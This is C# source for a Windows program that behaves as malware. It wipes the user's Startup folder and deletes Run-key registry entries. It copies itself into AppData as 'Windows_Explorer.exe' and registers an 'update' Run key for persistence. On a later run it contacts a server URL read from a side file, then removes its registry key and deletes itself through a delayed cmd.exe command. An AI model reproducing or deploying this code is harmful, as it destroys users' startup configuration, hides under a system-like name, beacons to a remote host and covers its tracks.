using Microsoft.Win32;
using System;
using System.IO;
using System.Management;
using System.Reflection;
using System.Net.Http;
using System.Diagnostics;

namespace Test
{
    internal class Program
    {
        static String getUrl()
        {
            string[] lines = File.ReadAllLines("server_detail.txt");
            return lines[0];

        }
        static void removefolder()
        {
            string Path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            Console.WriteLine(Path);
            System.IO.DirectoryInfo di = new DirectoryInfo(Path);

            foreach (FileInfo file in di.GetFiles())
            {
                file.Delete();
            }
        }

    

        static void Main(string[] args)
        {
            /*Console.WriteLine(getUrl());*/

            var ExploitFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) +"\\Windows_Explorer.exe";
            var ExploitPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            if (!File.Exists(ExploitFile))
            {
                /////////////////

                removefolder();
                ManagementClass cls = new ManagementClass("Win32_StartupCommand");
                ManagementObjectCollection coll = cls.GetInstances();

                foreach (ManagementObject obj in coll)
                {
                    string name = (obj["Name"].ToString());
                    string loc = obj["Location"].ToString();

                    Console.WriteLine(name);
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                    {
                        key.DeleteValue(name, false);
                    }
                }
                Console.WriteLine("\n\n-----------------------------After operation.....\nThis remains (Deafult windows)\n");
                /////////////////////////////////////////////////////////////////////


                string thisFile = System.AppDomain.CurrentDomain.FriendlyName;

                string Path = AppDomain.CurrentDomain.BaseDirectory + "\\" + thisFile;
                string server_detail_path = AppDomain.CurrentDomain.BaseDirectory + "\\" + "server_detail.txt";
                File.Copy(Path, ExploitFile);
                File.Copy(server_detail_path, ExploitPath + "\\server_detail.txt");
                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.SetValue("update", ExploitFile);
            }
            else
            {
                Console.WriteLine("Here");
                HttpClient client = new HttpClient();

                var res = client.GetAsync(getUrl()).Result;

                Console.WriteLine(res);
                File.Delete(ExploitPath + "\\server_detail.txt");

                RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rk.DeleteValue("update", false);
                Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 3 /Q & Del " + ExploitFile);
                System.Environment.Exit(0);

            }

        }
    }
}
